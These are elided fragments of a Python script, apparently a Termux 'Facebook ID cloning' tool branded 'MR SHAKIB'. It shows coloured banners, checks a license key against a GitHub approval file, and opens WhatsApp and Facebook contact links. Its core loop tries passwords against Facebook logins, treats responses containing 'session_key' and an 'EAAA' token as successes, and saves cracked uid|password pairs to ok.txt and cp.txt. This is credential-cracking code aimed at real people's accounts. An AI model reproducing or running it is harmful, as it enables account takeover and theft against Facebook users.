...
\t\033[1;97m[\x1b[1;97m\x1b[1;41m SHAKIBUR\x1b[0m\x1b[1;97m]

\t\033[1;97m[\x1b[1;97m\x1b[1;41m Version :6\x1b[0m\x1b[1;97m] \033[1;37m 

 

\t\033[1;97m[\x1b[1;97m\x1b[1;41m ADMIN   : ➳𝐂.𝐄.𝐎᭄𝑆𝐻𝐴𝐾𝐼𝐵𝑈𝑅 \x1b[0m\x1b[1;97m]

\t\033[1;97m[\x1b[1;97m\x1b[1;41m GITHUB   : N/A \x1b[0m\x1b[1;97m]
...
def helpnote():
	...
	subprocess.check_output(["am", "start", "https://github.com/Shakibur-Cyber-King/Approva.-txt-/blob/main/Approval.txt"])
...
def notice():
	...
	os.system('am start https://wa.me/+++ +9660531382117?text=' )

	runtxt("\033[0;97m Key Approval Ke MR SHAKIB >> %s%s"%(G,basesplit))

	runtxt("\033[0;97m Key Approve Dici Ar Time nosto Na kore Clone koro")

	time.sleep(5)

	os.system("xdg-open https://www.facebook.com/Itz.RAKiB.Sakib.Take.love")

	subprocess.check_output(["am", "start", "https://wa.me/+8801908735166?text="])
...
class Main:
	...
	def __init__(self):
		...
		try:
			...
			plr = requests.get('https://github.com/Shakibur-Cyber-King/Approva.-txt-/blob/main/Approval.txt').text
...
\t\033[1;97m[\x1b[1;97m\x1b[1;41m MR SHAKIB \x1b[0m\x1b[1;97m]

\t\033[1;97m[\x1b[1;97m\x1b[1;41m Version : 0.6\x1b[0m\x1b[1;97m] \033[1;37m 

\t\033[1;97m[\x1b[1;97m\x1b[1;41m ADMIN   : SHAKIBUR\x1b[0m\x1b[1;97m]

\t\033[1;97m[\x1b[1;97m\x1b[1;41m GITHUB   : N/A \x1b[0m\x1b[1;97m]

\t\033[1;97m[\x1b[1;97m\x1b[1;41m Facebook  :  Shakibur Rahman \x1b[0m\x1b[1;97m]
    ...
    """)
		...
		print("%s [%s1%s]%s \033[92;1mCRACK  FB IDZ 2009-10 {JUST NOW} %s(VIP-Clonning)"%(G,R,G,Y,B))
  ...
  'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:79.0) Gecko/20100101 Firefox/79.0'
		...
		for pw in pwx:
			...
			if "session_key" in response.text and "EAAA" in response.text:
				...
				print("\r  \033[0;97m   [SHAKIB-OK=>] %s | %s\033[0;97m         "%(uid, pw))

				self.ok.append("%s|%s"%(uid, pw))

				open("ok.txt","a").write("   [SHAKIB-OK=>]  %s|%s\n"%(uid, pw))

				break

			elif "www.facebook.com" in response.json()["error_msg"]:

				print("\r  \033[0;92m   [SHAKIB-CP=>] %s | %s\033[0;97m         "%(uid, pw))

				self.cp.append("%s|%s"%(uid, pw))

				open("cp.txt","a").write("   [SHAKIB-CP=>]  %s|%s\n"%(uid, pw))
...
if len(sys.argv) == 2:
	...
	if sys.argv[1] == "--info":
		...
		print(" [*] Team      :  MR SHAKIB\n")

		print(" [ Sosial Medi  ] \n")

		print(" [*] Facebook  : https://www.facebook.com/unavailable.this.link")
